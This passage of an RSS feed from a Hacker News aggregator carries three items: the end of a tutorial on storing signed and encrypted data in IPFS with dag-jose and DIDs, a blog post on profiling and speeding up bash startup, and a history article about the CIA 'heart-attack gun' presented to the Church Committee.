transforms the payload into a CID instance and sets it to the <code>link</code> property of the <em>DagJWS. </em>This allows us to easily traverse the resulting DAG.</p><h2 id="setup-your-environment">Setup your environment</h2><p>This section will cover how to set up some specific dependencies needed for this tutorial. If you just want to skip the setup part we have prepared <a href="https://ceramicstudio.github.io/web-playground/">a simple playground</a> which bundles ipfs, 3id-connect, and dids. You can use it by opening the web page, clicking on connect, then opening the developer console where you can run the commands. If you decide to do so, skip the following two sections.</p><h3 id="setup-ipfs-with-dag-jose-support">Setup IPFS with dag-jose support</h3><p>Since dag-jose is a new IPLD codec it's not yet included in js-ipfs by default. It also implements the new IPLD codec API which is also not supported by js-ipfs yet. Therefore we need to do the following when we are creating an instance of IPFS:</p><pre><code>import IPFS from 'ipfs'
import dagJose from 'dag-jose'
import multiformats from 'multiformats/basics'
import legacy from 'multiformats/legacy'

multiformats.multicodec.add(dagJose)
const dagJoseFormat = legacy(multiformats, dagJose.name)

const ipfs = await Ipfs.create({ ipld: { formats: [dagJoseFormat] } })
</code></pre><h3 id="setup-did-and-3id-connect">Setup DID and 3ID Connect</h3><p>In the example setup below we use an injected Ethereum provider (such as MetaMask) to create a 3ID Connect and DID instance.</p><pre><code>import { DID } from 'dids'
import { ThreeIdConnect, EthereumAuthProvider } from '3id-connect'

// create 3id connect instance
const addresses = await window.ethereum.enable()
const authProvider = new EthereumAuthProvider(window.ethereum, addresses[0])
await threeIdConnect.connect(authProvider)

// create did instance
const didProvider = await threeIdConnect.getDidProvider()
const did = new DID({ provider: didProvider })
await did.authenticate()
window.did = did
console.log('Connected with DID:', did.id)</code></pre><h2 id="create-a-signed-data-structure">Create a signed data structure</h2><p>We can now start signing and adding data to IPFS! First lets create a simple function that takes a payload, signs it using the <code>did.createDagJWS</code> method, and adds the resulting data to IPFS. As we can see in the code below we get two objects back from this method: <code>jws</code> which is the DagJWS itself and <code>linkedBlock</code> which is the raw bytes of the encoded payload. What happens in the background is that the payload gets encoded using <strong>dag-cbor</strong>, after this the CID of the encoded payload is used as the payload of the created <code>jws</code>. We can access this payload CID on the DagJWS instance as <code>jws.link</code>.</p><pre><code>async function addSignedObject(payload) {
  // sign the payload as dag-jose
  const { jws, linkedBlock } = await did.createDagJWS(payload)
  // put the JWS into the ipfs dag
  const jwsCid = await ipfs.dag.put(jws, { format: 'dag-jose', hashAlg: 'sha2-256' })
  // put the payload into the ipfs dag
  await ipfs.block.put(linkedBlock, { cid: jws.link })
  return jwsCid
}</code></pre><p>Using this function, let's create our first signed data objects:</p><pre><code>// Create our first signed object
const cid1 = await addSignedObject({ hello: 'world' })

// Log the DagJWS:
console.log((await ipfs.dag.get(cid1)).value)
// &gt; {
// &gt;   payload: "AXESIHhRlyKdyLsRUpRdpY4jSPfiee7e0GzCynNtDoeYWLUB",
// &gt;   signatures: [{
// &gt;     signature: "h7bHmTaBGza_QlFRI9LBfgB3Nw0m7hLzwMm4nLvcR3n9sHKRoCrY0soWnDbmuG7jfVgx4rYkjJohDuMNgbTpEQ",
// &gt;     protected: "eyJraWQiOiJkaWQ6MzpiYWdjcWNlcmFza3hxeng0N2l2b2tqcW9md295dXliMjN0aWFlcGRyYXpxNXJsem4yaHg3a215YWN6d29hP3ZlcnNpb24taWQ9MCNrV01YTU1xazVXc290UW0iLCJhbGciOiJFUzI1NksifQ"
// &gt;   }],
// &gt;   link: CID(bafyreidykglsfhoixmivffc5uwhcgshx4j465xwqntbmu43nb2dzqwfvae)
// &gt; }

// Log the payload:
ipfs.dag.get(cid1, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }

// Create another signed object that links to the previous one
const cid2 = addSignedObject({ hello: 'getting the hang of this', prev: cid1 })

// Log the new payload:
ipfs.dag.get(cid2, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; {
// &gt;   hello: 'getting the hang of this'
// &gt;   prev: CID(bagcqcerappi42sb4uyrjkhhakqvkiaibkl4pfnwpyt53xkmsbkns4y33ljzq)
// &gt; }

// Log the old payload:
ipfs.dag.get(cid2, { path: '/link/prev/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }
</code></pre><p>Note that the values of the CIDs and JWS will be different for you since the payload will be signed by your DID.</p><h2 id="verify-a-signed-data-structure">Verify a signed data structure</h2><p>Verifying a JWS is very straight forward. Simply retrieve the JWS object and pass it to the <code>verifyJWS</code> method. If the signature is invalid, this function will throw an error. If the signature is valid, it will will return the DID (with key fragment) that was used to sign the JWS.</p><pre><code>const jws1 = await ipfs.dag.get(cid1)
const jws2 = await ipfs.dag.get(cid2)

const signingDID1 = await did.verifyJWS(jws1)
await did.verifyJWS(jws2)
</code></pre><h2 id="encrypted-data-in-ipfs">Encrypted data in IPFS</h2><p>Signed data in IPFS is one piece of the puzzle, but perhaps more interesting is encrypted data. With the use of <em>dag-jose</em> and <em>EIP-2844</em> we can encrypt data to one or multiple DIDs and store it directly in IPFS. Below we demonstrate how to use the convenient tools provided by the <em>js-did</em> library to do this.</p><h2 id="encrypt-ipld-data">Encrypt IPLD data</h2><p>There is a simple method to create a DagJWE object which is encrypted to one or multiple DIDs, <code>createDagJWE</code>. This method accepts an IPLD object (a JSON object that may also include CID links) and an array of DIDs. It will resolve the DIDs to retrieve the public encryption keys found in their DID document and create a JWE that is encrypted to these keys. To get going, let's create a helper function that creates a JWE and puts it into IPFS.</p><pre><code>async function addEncryptedObject(cleartext, dids) {
    const jwe = await did.createDagJWE(cleartext, dids)
    return ipfs.dag.put(jwe, { format: 'dag-jose', hashAlg: 'sha2-256' })
}
</code></pre><p>Once we have this function we can create a few encrypted objects. In the example below we first create a simple encrypted object, then we create an additional encrypted object that links to the previous one.</p><pre><code>const cid3 = await addEncryptedObject({ hello: 'secret' }, [did.id])

const cid4 = await addEncryptedObject({ hello: 'cool!', prev: cid3 }, [did.id])</code></pre><p>Note that in the example above we use <code>[did.id](&lt;http://did.id&gt;)</code> to encrypt the data to the currently authenticated DID. We can of course also encrypt the data to the DID of a user that is not locally authenticated, such as another user!</p><h2 id="decrypt-ipld-data">Decrypt IPLD data</h2><p>When the data is retrieved from IPFS we will just get the encrypted JWE. This means that we need to decrypt the data after we fetch it. Since we have created objects that link to each other, lets create a function that retrieves these objects and decrypts them recursively.</p><pre><code>async function followSecretPath(cid) {
    const jwe = (await ipfs.dag.get(cid)).value
    const cleartext = await did.decryptDagJWE(jwe)
    console.log(cleartext)
    â€¦</code></pre></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/">https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/</a></em></p>]]>
            </description>
            <link>https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157017</guid>
            <pubDate>Fri, 20 Nov 2020 03:14:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Even faster bash startup (165 ms â†’ 40 ms)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156490">thread link</a>) | @Liskni_si
<br/>
November 19, 2020 | https://work.lisk.in/2020/11/20/even-faster-bash-startup.html | <a href="https://web.archive.org/web/*/https://work.lisk.in/2020/11/20/even-faster-bash-startup.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
			<article>
				<header>
					
					<p>
						published <time datetime="2020-11-20">2020-11-20</time>
						<a href="https://github.com/liskin/liskin.github.com/commits/master/_posts/2020-11-20-even-faster-bash-startup.md">(revision history)</a>
					</p>
				</header>
				<p>I sped up bash startup from 165&nbsp;ms to 40&nbsp;ms. Itâ€™s actually noticeable.
Why and how did I do it?</p>

<details id="toc">
  <summary>Table of Contents</summary>
<ul id="markdown-toc">
  <li><a href="#motivation" id="markdown-toc-motivation">Motivation</a></li>
  <li><a href="#investigation" id="markdown-toc-investigation">Investigation</a>    <ul>
      <li><a href="#man" id="markdown-toc-man">man</a></li>
      <li><a href="#death-by-a-thousand-cuts" id="markdown-toc-death-by-a-thousand-cuts">death by a thousand cuts</a></li>
      <li><a href="#completions" id="markdown-toc-completions">completions</a></li>
      <li><a href="#fzf" id="markdown-toc-fzf">fzf</a></li>
      <li><a href="#are-we-done-yet" id="markdown-toc-are-we-done-yet">are we done yet?</a></li>
      <li><a href="#history" id="markdown-toc-history">history</a></li>
    </ul>
  </li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
</ul>

</details>

<h3 id="motivation">Motivation</h3>

<p>Whenever I need to quickly look something up (or use a calculator), I open a
new terminal (using a keyboard shortcut) and start typing into it. Slow bash
startup disrupts this workflow as I would often type before the shell prompt:</p>

<p><img src="https://work.lisk.in/img/even-faster-bash-startup/mistype.png" alt="messed up prompt"></p>

<p><a href="https://twitter.com/danpker">Daniel Parker</a> recently wrote an excellent blog post <a href="https://danpker.com/posts/2020/faster-bash-startup/">Faster Bash
Startup</a> detailing his journey from 1.7 seconds to 210&nbsp;ms. I start at 165&nbsp;ms
and need to go significantly lower than Daniel, therefore different techniques
will be needed.</p>

<h3 id="investigation">Investigation</h3>

<p><a href="https://github.com/sharkdp/hyperfine">hyperfine</a> is a brilliant command-line tool for benchmarking commands that
I discovered recently (thanks to Daniel!), so letâ€™s see where we are now:</p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean Â± Ïƒ):     165.8 ms Â±   0.7 ms    [User: 156.3 ms, System: 12.8 ms]
  Range (min â€¦ max):   164.9 ms â€¦ 167.1 ms    17 runs
</code></pre></div></div>

<p>Now we need to find out whatâ€™s taking so long. <a href="https://stackoverflow.com/questions/5014823/how-to-profile-a-bash-shell-script-slow-startup/20855353">How to profile a bash shell
script slow startup?</a> Most Stack Overflow answers suggest some
variant of <code>set -x</code>, which will help us find any single command that takes
unusually long.</p>

<h4 id="man">man</h4>

<p>In my case, that command was <code>man -w</code>, specifically <a href="https://github.com/liskin/dotfiles/blob/7d14190467fe22bf5d4f85a7b202118d2341e3ed/.bashrc.d/10_env.sh#L8-L10">this piece of my
<code>.bashrc.d/â€‹10_env.sh</code></a>:</p>

<div><div><pre><code><span>export </span><span>MANPATH</span><span>=</span><span>$HOME</span>/.local/share/man:
<span># FIXME: workaround for /usr/share/bash-completion/completions/man</span>
<span>MANPATH</span><span>=</span><span>$(</span>man <span>-w</span><span>)</span>
</code></pre></div></div>

<p>Turns out none of this is needed any more, <code>man</code> and <code>manpath</code> now add
<code>~/.local/â€‹share/â€‹man</code> automatically so I can just drop it and save more than
100&nbsp;ms<sup id="fnref:man-seccomp" role="doc-noteref"><a href="#fn:man-seccomp">1</a></sup>.</p>

<h4 id="death-by-a-thousand-cuts">death by a thousand cuts</h4>

<p>But thatâ€™s it. No other single command stands out, itâ€™s just a lot of small
things that add up. Daniel says â€œit has to take <em>some</em> time,â€ and heâ€™s mostly
right, but I still have one trick up my sleeve.</p>

<p>My <code>.bashrc</code> is split into several smaller parts in <code>~/.bashrc.d</code>, so I can
profile these and see if anything stands out. My
<a href="https://github.com/liskin/dotfiles/blob/68964611b4b578b646cf5f13a47a4ee77e93e740/.bashrc"><code>.bashrc</code></a>
thus becomes:</p>

<div><div><pre><code><span>for </span>i <span>in</span> ~/.bashrc.d/<span>*</span>.sh<span>;</span> <span>do
	if</span> <span>[[</span> <span>$__bashrc_bench</span> <span>]]</span><span>;</span> <span>then
		</span><span>TIMEFORMAT</span><span>=</span><span>"</span><span>$i</span><span>: %R"</span>
		<span>time</span> <span>.</span> <span>"</span><span>$i</span><span>"</span>
		<span>unset </span>TIMEFORMAT
	<span>else</span>
		<span>.</span> <span>"</span><span>$i</span><span>"</span>
	<span>fi
done</span><span>;</span> <span>unset </span>i
</code></pre></div></div>

<p>Letâ€™s see what happensâ€¦</p>

<div><div><pre><code>[tomi@notes ~]$ __bashrc_bench=1 bash -i
/home/tomi/.bashrc.d/10_env.sh: 0,118
/home/tomi/.bashrc.d/20_history.sh: 0,000
/home/tomi/.bashrc.d/20_prompt.sh: 0,002
/home/tomi/.bashrc.d/30_completion_git.sh: 0,000
/home/tomi/.bashrc.d/31_completion.sh: 0,011
/home/tomi/.bashrc.d/50_aliases.sh: 0,002
/home/tomi/.bashrc.d/50_aliases_sudo.sh: 0,000
/home/tomi/.bashrc.d/50_functions.sh: 0,001
/home/tomi/.bashrc.d/50_git_dotfiles.sh: 0,008
/home/tomi/.bashrc.d/50_mc.sh: 0,000
/home/tomi/.bashrc.d/90_fzf.sh: 0,011
</code></pre></div></div>

<p>118&nbsp;ms in <code>10_env.sh</code> was caused by <code>man -w</code> and we know what to do with that.</p>

<h4 id="completions">completions</h4>

<p>11&nbsp;ms in <code>31_â€‹completion.sh</code> which loads <a href="https://github.com/scop/bash-completion">bash-completion</a>. Thatâ€™s
certainly better than Danielâ€™s 235&nbsp;ms, probably because up-to-date
bash-completion only loads a few necessary completions and defers everything
else to being loaded on demand. I couldnâ€™t live without the completions, so
11&nbsp;ms is a fair price.</p>

<p>8&nbsp;ms for <code>50_â€‹git_â€‹dotfiles.sh</code>, which defines a few aliases and
sets up git completions for my <code>git-dotfiles</code> alias, seems too much, though.
Good news is that we donâ€™t need to drop this. We can use bash-completionâ€™s
on-demand loading. Whenever completions for command <code>cmd</code> are needed for the
first time, bash-completion looks for
<code>~/.local/â€‹share/â€‹bash-completion/â€‹completions/â€‹cmd</code> or
<code>/usr/â€‹share/â€‹bash-completion/â€‹completions/â€‹cmd</code>.</p>

<p>Therefore,
<a href="https://github.com/liskin/dotfiles/blob/68964611b4b578b646cf5f13a47a4ee77e93e740/.local/share/bash-completion/completions/git-dotfiles"><code>~/.local/â€‹share/â€‹bash-completion/â€‹completions/â€‹git-dotfiles</code></a>
becomes:</p>

<div><div><pre><code>. /usr/share/bash-completion/completions/git
complete -F _git git-dotfiles
</code></pre></div></div>

<h4 id="fzf">fzf</h4>

<p><code>90_fzf.sh</code> loads key bindings and completions code so that <a href="https://github.com/junegunn/fzf">fzf</a> is used
when searching through history, completing <code>**</code> in filenames, etc. Well worth
the 11&nbsp;ms it needs to load<sup id="fnref:fzf" role="doc-noteref"><a href="#fn:fzf">2</a></sup>.</p>

<h4 id="are-we-done-yet">are we done yet?</h4>

<p>After these changes, I got:</p>

<div><div><pre><code>[tomi@notes ~]$ __bashrc_bench=1 bash -i
/home/tomi/.bashrc.d/10_env.sh: 0,001
/home/tomi/.bashrc.d/20_history.sh: 0,000
/home/tomi/.bashrc.d/20_prompt.sh: 0,002
/home/tomi/.bashrc.d/30_completion_git.sh: 0,000
/home/tomi/.bashrc.d/31_completion.sh: 0,012
/home/tomi/.bashrc.d/50_aliases.sh: 0,002
/home/tomi/.bashrc.d/50_aliases_sudo.sh: 0,000
/home/tomi/.bashrc.d/50_functions.sh: 0,001
/home/tomi/.bashrc.d/50_git_dotfiles.sh: 0,000
/home/tomi/.bashrc.d/50_mc.sh: 0,000
/home/tomi/.bashrc.d/90_fzf.sh: 0,011
</code></pre></div></div>

<p>Thatâ€™s 29&nbsp;ms, brilliant! Orâ€¦ is it? <emoji>ğŸ¤”</emoji></p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean Â± Ïƒ):      55.7 ms Â±   1.0 ms    [User: 47.6 ms, System: 11.1 ms]
  Range (min â€¦ max):    54.8 ms â€¦  58.9 ms    53 runs
</code></pre></div></div>

<h4 id="history">history</h4>

<p>Some of those additional 26&nbsp;ms are spent reading my huge
(<code>HISTSIZE=â€‹50000</code>) <code>.bash_â€‹history</code> file. I will skip the details
about how I investigated this, because I didnâ€™t: I stumbled upon this by
chance while testing something else.</p>

<p>We can see that using an empty history file brings us down to a little under
40&nbsp;ms:</p>

<div><div><pre><code>[tomi@notes ~]$ HISTFILE=/tmp/.bash_history_tmp hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean Â± Ïƒ):      38.6 ms Â±   0.7 ms    [User: 34.0 ms, System: 7.8 ms]
  Range (min â€¦ max):    37.8 ms â€¦  42.3 ms    75 runs
</code></pre></div></div>

<p>Now, cutting 17&nbsp;ms by sacrificing the shell history is probably not a good
deal for most people. I settled for setting up a systemd
<a href="https://github.com/liskin/dotfiles/blob/f978be7424946afebe56dbe5ecc85c9f36d1e057/.config/systemd/user/liskin-backup-bash-history.timer">timer</a>
to <a href="https://github.com/liskin/dotfiles/blob/f978be7424946afebe56dbe5ecc85c9f36d1e057/bin/liskin-backup-bash-history">back up
<code>.bash_â€‹history</code></a>
to git once a day and lowered <code>HISTSIZE</code> to 5000<sup id="fnref:history" role="doc-noteref"><a href="#fn:history">3</a></sup>. This still keeps
my bash startup below 40&nbsp;ms:</p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean Â± Ïƒ):      39.9 ms Â±   0.5 ms    [User: 36.1 ms, System: 6.8 ms]
  Range (min â€¦ max):    39.1 ms â€¦  42.1 ms    73 runs
</code></pre></div></div>

<h3 id="conclusion">Conclusion</h3>

<p>By dropping unnecessary invocation of <code>man -w</code>, deferring loading of git
completions to when theyâ€™re needed, and shortening my shell history file, I
managed to speed up bash startup from 165 ms to 40 ms.</p>

<div><div><pre><code>Benchmark #1: bash -i
  Time (mean Â± Ïƒ):     165.8 ms Â±   0.7 ms    [User: 156.3 ms, System: 12.8 ms]
  Range (min â€¦ max):   164.9 ms â€¦ 167.1 ms    17 runs
</code></pre></div></div>

<div><div><pre><code>Benchmark #1: bash -i
  Time (mean Â± Ïƒ):      39.9 ms Â±   0.5 ms    [User: 36.1 ms, System: 6.8 ms]
  Range (min â€¦ max):    39.1 ms â€¦  42.1 ms    73 runs
</code></pre></div></div>

<p>More importantly, I no longer type before the prompt, even if I try!</p>

<p><img src="https://work.lisk.in/img/even-faster-bash-startup/corrtype.png" alt="not messed up prompt"></p>

<p>And at this point I can finally agree with Daniel that further tweaking will
only have diminishing returns<sup id="fnref:latency" role="doc-noteref"><a href="#fn:latency">4</a></sup>. <emoji>ğŸ˜Š</emoji></p>

<hr>


			</article>
		
		</div></div>]]>
            </description>
            <link>https://work.lisk.in/2020/11/20/even-faster-bash-startup.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156490</guid>
            <pubDate>Fri, 20 Nov 2020 01:32:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CIA Heart Attack Gun]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156405">thread link</a>) | @simonebrunozzi
<br/>
November 19, 2020 | https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true/7/ | <a href="https://web.archive.org/web/*/https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true/7/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="loop_parent"><article data-url="https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true/7/" data-perm="https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true//?subpage_1" data-title="Conspiracy: 8 Far-Fetched Theories That Turned Out To Be True" data-id="41735" data-multipage="1" data-page="7"><div><figure id="attachment_41751" aria-describedby="caption-attachment-41751"><img loading="lazy" alt="" width="600" height="360" data-src="https://cdn.historycollection.com/wp-content/uploads/2017/10/CIAs-Heart-Attack-Gun.jpg" src="https://cdn.historycollection.com/wp-content/uploads/2017/10/CIAs-Heart-Attack-Gun.jpg"><figcaption id="caption-attachment-41751">Senator Frank Church displays the CIAâ€™s top-secret weapon known as the â€œheart-attack gun.â€ longroom.com</figcaption></figure><p><strong>CIA HEART ATTACK GUN</strong><br>Mary Embree, who began her career in the CIA as a secretary in the Audio-Surveillance Divison before being promoted to the Technical Services department, says she was asked to research a poison that would induce a heart attack in its victim but would be undetectable in a post-mortem. Embreeâ€™s research led to the development of a top-secret weapon known as the â€œheart-attack gun.â€</p><p>It involved the freezing of shellfish toxin mixed with water to form a frozen dart which would then be fired from the heart-attack gun. Once inside the body, the poison would then dissolve into the personâ€™s bloodstream and cause a heart attack.</p><p>In 1975 CIA Director William Colby presented the weapon at a Church Committee hearing, chaired by Senator Frank Church. The heart attack gun was a handgun with a sight affixed to the top, had a battery in the handle, and used electricity to fire a dart.</p><p>Colby told the committee that the weapon was capable of firing a dart which could enter the body â€œwithout perception.â€ The only way of knowing that the person had been shot by the weapon, was the presence of a tiny red dot at the point of entry. Colby also claimed that the poison would not show up in the autopsy. The official cause of death would, therefore, be deemed a heart attack. The weapon was developed in order to allow the CIA to commit assassinations that could never be traced back to them.</p><p id="loadergif"><img width="100" height="100" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAMAAAACCAQAAAA3fa6RAAAAEElEQVR42mN8V88ABIwQCgAaPALd7KlyxgAAAABJRU5ErkJggg==" data-src="data:image/gif;base64,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